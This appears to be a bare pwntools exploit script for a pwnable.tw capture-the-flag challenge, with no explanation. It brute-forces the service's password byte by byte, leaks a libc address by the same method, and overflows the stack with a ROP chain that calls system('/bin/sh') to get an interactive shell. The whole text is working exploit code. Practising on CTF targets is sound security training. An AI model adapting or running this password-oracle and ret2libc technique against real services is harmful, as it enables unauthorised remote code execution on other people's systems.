from pwn import *
context(arch = 'amd64', os = 'linux')


conn = remote('chall.pwnable.tw', 10205)




def findOccurrences(s, ch):
    return [i for i, letter in enumerate(s) if letter == ch]

def Replace(s, upper_bound, old, new):
    return s[0:upper_bound].replace(old, new) + s[upper_bound:]

def Sendraw(s):
    conn.send(s)


def Login(s):
    conn.read(),
    Sendraw('1')
    conn.read(),
    Sendraw(s + '\x00')
    recv = conn.readline()
    if recv.find(b'Success') != -1:
        return True
    else:
        return False

def Logout():
    conn.read(),
    Sendraw('1')

# leak password
Password = ''
with log.progress("leaking password") as l:
    while len(Password) < 0x10:
        bFound = False
        l.status (' %s' % Password)
        for i in range(1, 256):
            if Login(Password + chr(i)) == True:
                Logout()
                Password += chr(i)
                
                bFound = True
                break
        assert(bFound == True)
    l.success()

conn.read(),
Sendraw('1')
conn.read(),
Sendraw(Password + '\x00' * 16 + 'A' * 40)
conn.read(),
Sendraw('3')
conn.read(),
Sendraw('A' * 63)
Logout()

# leak libc address
libc_offset_0x78439_addr = b'AAAAAAAA'
while len(libc_offset_0x78439_addr) < 0x10:
    bFound = False
    for i in range(1, 256)[::-1]:
        if Login(libc_offset_0x78439_addr + chr(i)) == True:
            Logout()
            libc_offset_0x78439_addr += chr(i)
            bFound = True
            break
    if bFound == False:
        break
libc_offset_0x78439_addr = libc_offset_0x78439_addr[8:]
libc_offset_0x78439_addr += (8 - len(libc_offset_0x78439_addr)) * b'\x00'
libc_offset_0x78439_addr = unpack(libc_offset_0x78439_addr, 64)
libc_base_addr = libc_offset_0x78439_addr - 0x78439
print ('[*] Password = %s' % Password)
print ('[*] libc_base_addr = 0x%016x' % libc_base_addr)

# build ROP chain
libc_system = libc_base_addr + 0x0000000000045390
libc_bin_sh_addr = libc_base_addr + 0x000000000018C177
# 0x0000000000021102 : pop rdi ; ret
payload = pack(libc_base_addr + 0x0000000000021102, 64) + pack(libc_bin_sh_addr, 64) + pack(libc_system, 64)

# send ROP chain
conn.read(),
Sendraw('1')
conn.read(),
Sendraw(('\x00' + 'A' * 63 + Password + 'A' * 16 + 'fuckfuck' + payload.replace('\x00', 'A'))[:127])
conn.read(),
Sendraw(b'3')
conn.read(),
Sendraw(b'A' * 63)
Logout()

for i in findOccurrences(payload, '\x00')[::-1]:
    conn.read(),
    Sendraw('1')
    conn.read(),
    Sendraw(('\x00' + 'A' * 63 + Password + 'A' * 16 + 'fuckfuck' + Replace(payload, i, '\x00', 'A'))[:127])
    conn.read(),
    Sendraw('3')
    conn.read(),
    Sendraw('A' * 63)
    Logout()

# exit to trigger ROP chain
Login(Password)
conn.read(),
Sendraw(b'2')
conn.interactive()